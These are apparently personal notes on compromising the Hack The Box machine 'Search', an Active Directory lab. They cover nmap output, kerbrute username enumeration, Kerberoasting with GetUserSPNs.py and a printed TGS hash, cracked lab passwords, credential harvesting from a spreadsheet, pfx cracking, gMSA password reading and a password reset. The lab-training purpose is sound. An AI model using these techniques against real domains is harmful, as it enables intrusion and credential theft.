IP: 10.10.11.129
Nmap scan:
```bash
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-30 15:42:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-04-30T15:44:58+00:00; +1m39s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-04-30T15:44:58+00:00; +1m39s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-04-30T15:44:58+00:00; +1m39s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-04-30T15:44:58+00:00; +1m39s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-04-30T15:44:58+00:00; +1m39s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/1%Time=626D586C%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m38s, deviation: 0s, median: 1m38s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-30T15:44:21
|_  start_date: N/A


```

host of search.htb
website for usernames
and do some formatting of 
Firstname.lastname
Firstinitallastname
lastname
firstname

kerbrute for usernames
Valid for:
- Sierra.Frye
- Keely.Lyons
- Dax.Santiago
- Hope.Sharp
On image on website there is a password of IsolationIsKey?

creds are now Hope.sharp:IsolationIsKey?
python ingester to get bloodhound data.
running GetUserSPN.py to see if WEB_SVC hash easy to crack hash using hope's creds.

```bash
python3 GetUserSPNs.py search.htb/hope.sharp:IsolationIsKey? -request
```

returns a hash
```bash
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$0029255a8931d9d7ceac7aeed8b245bb$52d35a5c04d48a873ffd64935eea63a458ec12fba19f582c73d46f1665b89563788c6a45a948109a29b7437966943e3e4135760ab4a521634af1d1c092f25492155c175f180e095ac9bafc2b93b63203306888551758fae550c869f7994913d4cc335acab0381aa9490ed87bc64f058c8e01a71af9b8bbae01e6cae9004fdbc99b2e3c9aa9a5be68aacca4b611e755fd015a53ee278a0f77835f81a832ed1f39d9e2b2c89ddd66cd54b730ef1afc79e42b2c03433e16d00514e1ef485fdceb60becc5083224584e4d17ad933b1aa661ead58b186acda5fa1a0dd44fe0e393d225596960657b20f1c1de89cf224333704cfb6598797773d3281d4b6a171c8146baad8b6e5658836da220087e3af04893d084f813c9350c298e405b7ee998450bc8b8d0074bca33a04bc7461d6192118b306ac0d7662725b9e0190b5d1c9181b2a954a7ef8b11f8343c8c6345894a296e69d8da926ed69882f9263bf30c79771f875879b4e28e22dd1ea61547d3caf0ff0c7b22f444e527e557dfdb9c9f236946c5ffb42ecdfd3517bf6c71e37b007b1e89b14f9b8ad12fadce7c93ea31367af0e7c4f4aab7061384ac79c135e7cf8a78e54366bbb1a39896748cac7c6cc39308ffd9133e3a24506f4e65b304ec5e3cdc35671a240bb5b6d24006c31bed3ad15f456f46fcf2fb3581fec643c6353f44a0e55dc61b8e95c97c9c023932fe7a3b57c305f4e6a9a2ab3af676224bcc674084ccd79798d91c2c6b858b5877b03944ae72139285a07b1206cdd39d33d66b0a9a45491fee19523da81934c2397ba9e9663ff12095c74af6f8b2b8457f2b07c66f71288db7a372a5139dc81f8701a2f36e6c7c5ffe762307b4db449deae72b9488ccc6ae4e160cc7bf54652330572e843be0e166666bcce0b3b3b23d7e785faa701002d0d5940e5b2419aef33c97ac0391a005c750cff7ebd6d90cb7fddf2e8932dab9baca9b420e0c9af2f37f5ade4fef39e2eed76d0070f799d24fb3567d081b80c0473ddb5d7b8463e35c60b5651b2108108d5aa1b9d7f5d28493c20b64bc3747133e2b4b7b5f2cceb266723c158a6096f3fe05c11ca9775325aac31ba9387b34886de7ff4ba129b2c962843527d318035eeb73d98e7a36ed54bb9c6c0f11fbfc2243be483afcf941281a7a933fc479d044165fca0d7c04e458629ffaa1869eb4f97a4bf17f36b92a1187daa6c0a3648a0d31477759b1b766d5a195093e07285be73b9610a77156709fb81f9bb440f19c4697de8018aff29d85c38822a05c336611fd9b9e07b0bfcc7df69e834572d2d30c3a68874174ff678d6888ec3dfe5a45778d7301cb78e1e34133d0e19cd65dac40fb02506807de62a2d0a73518ffba9b8a6a4fcbb16cbe4a1ceddb1c44225a382cc227b566ed024c4a01cfd74eba732d876e4b127b47ebd4b622005553f0fc9eae0a688e6bfea074f9aa580957f0420554624431a
```
password: @3ONEmillionbaby

with the user json file for bloodhound we can get more usernames
```bash
cat 20220501020832_users.json |jq '.data[].Properties| select (.enabled ==true)| .name' >fullusers
```
json magic

now run kerbtute against the usernames
it works for edgar.jacobs
still nothing in bloodhound

smbclient with edgar.jacobs
find xlsx file and remove the protection as the document isnt encrypted.
get the users and passwords from the xlsx doc
check with crackmapexec works for sierra.Frye
```bash
$$49=wide=STRAIGHT=jordan=28$$18
```

login to smb and get the flag file.
also two more files
crack pfx with crackpkcs12
password of misspissy

add the cert with the password and go to /staff dir
web powershell :)

get-adserviceaccount BIR-ADFS-GMSA
the password is bytes not even ascii

change password of tristan davies
trying to login to web powershell with creds dont work cause cert

so just change the $cred to his